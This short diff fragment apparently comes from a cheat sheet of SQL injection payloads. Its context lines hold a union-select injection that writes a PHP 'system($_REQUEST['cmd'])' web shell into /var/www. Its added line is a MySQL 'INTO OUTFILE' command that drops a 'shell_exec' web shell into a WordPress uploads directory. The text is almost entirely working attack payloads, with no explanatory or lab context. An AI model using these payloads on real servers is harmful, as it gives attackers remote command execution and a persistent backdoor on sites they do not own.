@@ -42,3 +42,7 @@ additionals
 UDF 
 
 ’ union select “<? system($_REQUEST[‘cmd’]); ?>”,2,3 INTO OUTFILE ‘/var/www/test/execcmd.php’#
+
+
+
+mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
